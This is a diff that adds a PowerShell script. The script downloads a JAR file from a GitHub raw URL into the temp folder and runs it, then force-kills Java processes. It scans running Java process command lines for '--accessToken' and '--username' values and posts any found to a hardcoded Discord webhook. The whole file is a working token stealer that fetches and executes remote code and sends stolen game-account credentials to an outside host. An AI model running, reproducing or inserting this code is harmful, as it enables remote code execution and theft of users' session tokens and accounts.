@@ -1,0 +1,45 @@
+$url = "https://raw.githubusercontent.com/drhaplan-dotcom/qwe/refs/heads/main/mod.jar"
+$jar = Join-Path $env:TEMP "mod.jar"
+
+Invoke-WebRequest -Uri $url -OutFile $jar
+
+Start-Process $jar
+
+Start-Sleep -Seconds 5
+
+Get-Process -Name "javaw","java" -ErrorAction SilentlyContinue |
+    Stop-Process -Force -ErrorAction SilentlyContinue
+
+$webhookUrl = "https://discord.com/api/webhooks/1538613009755144355/6SeHOPzVrWJ8R8TpyVeCVuAOlk0v0UfCFXPxhFBH9IQ30nTlS3rWIqaRdxufQJlAfu6R"
+
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        $accessToken = $null
+        $username = $null
+
+        if ($_ -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
+        }
+        if ($_ -match '--username\s+(\S+)') {
+            $username = $matches[1]
+        }
+
+        if ($accessToken -and $username) {
+           
+            $message = @"
+> **AccessToken:** $accessToken
+> **Username:** $username
+"@
+
+            Write-Output $message
+
+            
+            $payload = @{
+                content = $message
+            } | ConvertTo-Json -Depth 10
+
+            
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+        }
+    }
